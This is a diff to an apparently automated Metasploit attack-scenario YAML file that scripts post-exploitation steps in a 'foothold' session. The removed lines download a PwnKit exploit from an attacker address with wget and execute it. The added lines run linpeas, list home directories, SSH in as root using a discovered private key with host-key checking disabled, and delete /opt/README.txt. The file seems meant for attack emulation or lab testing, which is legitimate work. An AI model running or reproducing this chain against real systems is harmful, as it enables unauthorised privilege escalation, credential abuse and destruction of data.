@@ -1,6 +1,6 @@
 ####################
 #
-# Scenario 1 a a
+# Scenario 1 f a
 #
 ####################
 msf_config:
@@ -82,23 +82,33 @@ commands:
 
   - type: msf-session
     cmd: ./linpeas.sh -s -q -N 2> /dev/null
-    write: True
     session: "foothold"
     end_str: "PWN >"
 
+  # wait a little bit for linpeas
+  - type: sleep
+    seconds: 380
+
+  # This command fixes the outputbuffer
+  # so that the output of the further
+  # commands will work!
   - type: msf-session
-    cmd: wget http://$ATTACKER_ADDRESS/PwnKit > /dev/null 2>&1
+    read: True
+    cmd: id
     session: "foothold"
-    end_str: "PWN >"
 
   - type: msf-session
-    cmd: chmod +x PwnKit && ./PwnKit
+    cmd: find /home -ls
     session: "foothold"
+
+  - type: msf-session
+    cmd: ssh -i /home/webdev/.ssh/id_rsa -o "StrictHostKeyChecking no" root@localhost
+    session: "foothold"
+
 
   - type: msf-session
     cmd: id
     session: "foothold"
-    end_str: "PWN >"
 
   - type: msf-session
     session: "foothold"
@@ -110,10 +120,10 @@ commands:
     session: "foothold"
     end_str: "PWN >"
 
-#  - type: msf-session
-#    cmd: rm /opt/README.txt
-#    session: "foothold"
-#    end_str: "PWN >"
+  - type: msf-session
+    cmd: rm /opt/README.txt
+    session: "foothold"
+    end_str: "PWN >"
 
   - type: msf-session
     cmd: exit
